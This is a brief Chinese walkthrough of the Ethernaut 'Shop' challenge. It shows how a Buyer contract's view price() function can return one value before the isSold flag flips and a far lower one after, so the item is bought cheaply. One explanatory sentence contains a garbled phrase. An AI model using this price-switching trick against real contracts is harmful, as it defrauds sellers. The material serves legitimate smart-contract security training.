# Shop

## Reference
[Shop](https://ethernaut.openzeppelin.com/level/21)

[Shop.sol](https://github.com/yuhuajing/ethernaut-book/blob/main/src/21-Shop/Shop.sol)

## 目标
用少于商品价格的钱购买商品

## 分析
### view
```solidity
interface Buyer {
    function price() external view returns (uint256);
}
```
1. `view` 修饰符表示当前函数不会更新 storage参数，因此不能按照 bool flag的方式实现多次调用的不同结果
```solidity
    function buy() public {
        Buyer _buyer = Buyer(msg.sender);
        require(_buyer.price() >= price, "Lower price");
        require(!isSold, "Sold");
        isSold = true;
        price = _buyer.price();
    }
```
2. `isSold` 参数的更新在下一次的函数调用植物i四年，因此可以通过 `isSold` 参数判断当前的调用
```solidity
    function price() external  view returns (uint256) {
    if (!shop.isSold()) {
        return _price;
    } else {
        return _price / 20;
    }
}
```
